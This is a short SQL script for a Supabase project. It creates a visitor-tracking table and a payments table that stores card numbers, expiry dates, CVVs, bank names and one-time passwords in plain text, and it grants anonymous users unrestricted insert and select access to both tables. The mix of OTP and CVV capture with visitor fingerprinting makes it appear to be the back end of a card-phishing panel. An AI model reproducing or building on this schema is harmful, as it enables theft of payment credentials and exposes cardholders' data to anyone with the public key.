-- Run this SQL in your Supabase SQL editor to create the required tables

-- Visitor Tracking Table
CREATE TABLE IF NOT EXISTS visitor_tracking (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    page TEXT,
    ip TEXT,
    user_agent TEXT,
    os TEXT,
    device TEXT,
    browser TEXT,
    location TEXT,
    session_data JSONB,
    last_active TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Payments Table
CREATE TABLE IF NOT EXISTS payments (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    card_number TEXT,
    expiry TEXT,
    cvv TEXT,
    name TEXT,
    bank_name TEXT,
    otp TEXT,
    amount NUMERIC,
    currency TEXT,
    visitor_id UUID, -- Optional foreign key to visitor_tracking
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable RLS (Row Level Security)
ALTER TABLE visitor_tracking ENABLE ROW LEVEL SECURITY;
ALTER TABLE payments ENABLE ROW LEVEL SECURITY;

-- Allow anonymous inserts and selects if you are using the SUPABASE_ANON_KEY in your environment variables
CREATE POLICY "Allow anonymous inserts on visitor_tracking" ON visitor_tracking FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY "Allow anonymous selects on visitor_tracking" ON visitor_tracking FOR SELECT TO anon USING (true);

CREATE POLICY "Allow anonymous inserts on payments" ON payments FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY "Allow anonymous selects on payments" ON payments FOR SELECT TO anon USING (true);

-- (Optional) If you are using an authenticated user, you would use 'authenticated' instead of 'anon'
